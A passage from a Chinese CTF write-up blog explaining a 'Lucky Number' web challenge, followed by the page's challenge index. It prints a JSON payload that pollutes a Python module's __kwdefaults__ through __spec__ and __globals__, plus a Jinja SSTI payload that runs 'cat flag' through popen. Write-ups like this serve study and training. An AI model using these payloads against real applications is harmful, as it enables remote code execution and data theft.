</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> {<span style=color:#e6db74>&#34;message&#34;</span>: <span style=color:#e6db74>&#34;你有什么想创造的吗？&#34;</span>, <span style=color:#e6db74>&#34;lucky_number&#34;</span>: <span style=color:#e6db74>&#34;nope&#34;</span>}
</span></span></code></pre></div><p>也是一道原生类的题目orz</p><p>从已知的代码进行分析，在heaven.py里有create函数的<code>__kwdefaults__</code>,同时还需要confirm是true.涉及动态加载模块或处理模块之间的依赖时,需要<code>sys.modules</code> 来访问已经加载的模块.回到代码中并没有导入sys模组，这时可以利用python的内置函数<code>__spec__</code>.包含了关于类加载时的信息，定义在Lib/importlib/_bootstrap.py的类ModuleSpec，所以可以直接采用&lt;模块名>.<strong>spec</strong>.<strong>init</strong>.<strong>globals</strong>[&lsquo;sys&rsquo;]获取到sys模块，此处就可以使用json模块获取.(以上跟着官p学的，我还没学这么多orz)</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>Content-Type: application/json
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;__init__&#34;</span>: {
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;__globals__&#34;</span>: {
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;json&#34;</span>:{
</span></span><span style=display:flex><span>                <span style=color:#f92672>&#34;__spec__&#34;</span>:{
</span></span><span style=display:flex><span>                    <span style=color:#f92672>&#34;__init__&#34;</span> : {
</span></span><span style=display:flex><span>                        <span style=color:#f92672>&#34;__globals__&#34;</span> : {
</span></span><span style=display:flex><span>                            <span style=color:#f92672>&#34;sys&#34;</span> : {
</span></span><span style=display:flex><span>                                <span style=color:#f92672>&#34;modules&#34;</span> : {
</span></span><span style=display:flex><span>                                    <span style=color:#f92672>&#34;heaven&#34;</span> : {
</span></span><span style=display:flex><span>                                        <span style=color:#f92672>&#34;create&#34;</span> : {
</span></span><span style=display:flex><span>                                              <span style=color:#f92672>&#34;__kwdefaults__&#34;</span> : {
</span></span><span style=display:flex><span>                                              <span style=color:#f92672>&#34;confirm&#34;</span> : <span style=color:#66d9ef>true</span>,
</span></span><span style=display:flex><span>                                              <span style=color:#f92672>&#34;lucky_number&#34;</span> : <span style=color:#e6db74>&#34;5346&#34;</span>
</span></span><span style=display:flex><span>                                             } 
</span></span><span style=display:flex><span>                                        }
</span></span><span style=display:flex><span>                                    }
</span></span><span style=display:flex><span>                                }
</span></span><span style=display:flex><span>                            }
</span></span><span style=display:flex><span>                        }
</span></span><span style=display:flex><span>                    }
</span></span><span style=display:flex><span>                }
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>然后会变成<code>快去/ssSstTti1注入吧</code></p><p>然后就是普通的无过滤的ssti注入</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>{{</span><span style=color:#e6db74>&#34;&#34;</span>.__class__.__bases__<span style=color:#f92672>[</span>0<span style=color:#f92672>]</span>.__subclasses__<span style=color:#f92672>()[</span>132<span style=color:#f92672>]</span>.__init__.__globals__<span style=color:#f92672>[</span><span style=color:#e6db74>&#39;popen&#39;</span><span style=color:#f92672>](</span><span style=color:#e6db74>&#39;cat flag&#39;</span><span style=color:#f92672>)</span>.read<span style=color:#f92672>()}}</span>
</span></span></code></pre></div><h3 id=just-readme>Just Readme</h3><p>官p给的是<a href=https://github.com/ambionics/cnext-exploits>ambionics/cnext-exploitsCNEXT 的漏洞(CVE-2024-2961)</a></p></div></div></div><button id=tocFab class=toc-fab type=button aria-label="Toggle TOC">目录</button><aside id=tocDrawer class=toc-drawer aria-hidden=true><div class=toc-drawer-head><div class=toc-drawer-title>目录</div><button id=tocClose class=toc-close type=button aria-label="Close TOC">×</button></div><nav class=toc-drawer-body><nav id=TableOfContents><ul><li><a href=#week1>Week1</a><ul><li><a href=#crypto>Crypto</a><ul><li><a href=#hello_crypto>hello_crypto</a></li><li><a href=#ez_rsa>ez_rsa</a></li><li><a href=#你会算md5吗>你会算md5吗</a></li><li><a href=#十七倍>十七倍</a></li><li><a href=#babypack>babypack</a></li></ul></li><li><a href=#re>Re</a><ul><li><a href=#you-are-good-at-ida>You are good at IDA</a></li><li><a href=#upx-mini>UPX mini</a></li><li><a href=#ez_maze>ez_maze</a></li><li><a href=#baseplus>BasePlus</a></li><li><a href=#ez-xor>Ez Xor</a></li></ul></li><li><a href=#pwn>Pwn</a><ul><li><a href=#签个到吧>签个到吧</a></li><li><a href=#echo>echo</a></li><li><a href=#我把她丢了>我把她丢了</a></li><li><a href=#re2text>Re2text</a></li><li><a href=#shellcode_level0>shellcode_level0</a></li></ul></li><li><a href=#web>web</a><ul><li><a href=#http-是什么呀>HTTP 是什么呀</a></li><li><a href=#喵喵喵ﻌ>喵喵喵´•ﻌ•`</a></li><li><a href=#md5绕过欸>md5绕过欸</a></li><li><a href=#a-dark-room>A Dark Room</a></li><li><a href=#upload>upload</a></li><li><a href=#aura-酱的礼物>Aura 酱的礼物</a></li></ul></li><li><a href=#misc>Misc</a><ul><li><a href=#你也喜欢圣物吗>你也喜欢圣物吗</a></li><li><a href=#根本进不去啊>根本进不去啊!</a></li><li><a href=#海上遇到了鲨鱼>海上遇到了鲨鱼</a></li><li><a href=#正着看还是反着看呢>正着看还是反着看呢？</a></li><li><a href=#base>Base</a></li><li><a href=#签到dk-盾>签到！DK 盾！</a></li><li><a href=#人生苦短我用python>人生苦短，我用Python</a></li><li><a href=#倒计时海报>倒计时？海报！</a></li><li><a href=#喵喵太可爱了>喵喵太可爱了</a></li></ul></li></ul></li><li><a href=#week2以后只写web了orz>week2(以后只写web了，orz)</a><ul><li><a href=#web-1>web</a><ul><li><a href=#ez_ser>ez_ser</a></li><li><a href=#一起吃豆豆>一起吃豆豆</a></li><li><a href=#happy-birthday>Happy Birthday</a></li><li><a href=#你听不到我的声音>你听不到我的声音</a></li><li><a href=#really-ez-pop>Really EZ POP</a></li><li><a href=#rceisamazingwithspace>RCEisamazingwithspace</a></li><li><a href=#数学大师>数学大师</a></li><li><a href=#所以你说你懂-md5>所以你说你懂 MD5?</a></li></ul></li></ul></li><li><a href=#week3>week3</a><ul><li><a href=#web-2>web</a><ul><li><a href=#ez_php_jail>ez_php_jail</a></li><li><a href=#复读机>复读机</a></li><li><a href=#滤个不停>滤个不停</a></li><li><a href=#玩原神玩的>玩原神玩的</a></li></ul></li></ul></li><li><a href=#week4>week4</a><ul><li><a href=#web-3>web</a><ul><li><a href=#flag直接读取不就行了>flag直接读取不就行了？</a></li><li><a href=#圣钥之战10>圣钥之战1.0</a></li><li><a href=#only-one-sql>only one sql</a></li><li><a href=#no-jwt>No JWT</a></li></ul></li></ul></li><li><a href=#fin>Fin</a><ul><li><a href=#web-4>web</a><ul><li><a href=#1z_php>1z_php</a></li><li><a href=#ez_php>ez_php</a></li><li><a href=#jinja-mark>Jinja Mark</a></li><li><a href=#back-to-the-future>Back to the future</a></li><li><a href=#rce-or-sql-inject>RCE or Sql Inject</a></li><li><a href=#sql-inject-or-rce>Sql Inject or RCE</a></li><li><a href=#lucky-number>Lucky Number</a></li><li><a href=#just-readme>Just Readme</a></li></ul></li></ul></li></ul></nav></nav></aside><script>(function(){const s=document.getElementById("tocFab"),e=document.getElementById("tocDrawer"),o=document.getElementById("tocClose");if(!s||!e)return;const t="pm_toc_open";function i(){e.classList.add("open"),e.setAttribute("aria-hidden","false");try{localStorage.setItem(t,"1")}catch{}}function n(){e.classList.remove("open"),e.setAttribute("aria-hidden","true");try{localStorage.setItem(t,"0")}catch{}}function a(){e.classList.contains("open")?n():i()}s.addEventListener("click",a),o&&o.addEventListener("click",n),document.addEventListener("keydown",e=>{e.key==="Escape"&&n()});try{localStorage.getItem(t)==="1"&&i()}catch{}})()</script><nav class=paginav><a class=prev href=http://localhost:1313/posts/ctf/nepctf2024/><span class=title>«</span><br><span>nepctf2024复盘</span>
</a><a class=next href=http://localhost:1313/posts/ctf/dasctf-2024%E6%9A%91%E6%9C%9F%E6%8C%91%E6%88%98%E8%B5%9B/><span class=title>»</span><br><span>DASCTF 2024暑期挑战赛</span></a></nav></article></main><footer class=footer><span>© 2026
<a href=http://localhost:1313/>0raN9e's Blog</a>· Powered by <a href=https://gohugo.io/>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod>PaperMod</a>· adapted by <span style=letter-spacing:.12em>0ran9e</span></span></footer></body></html>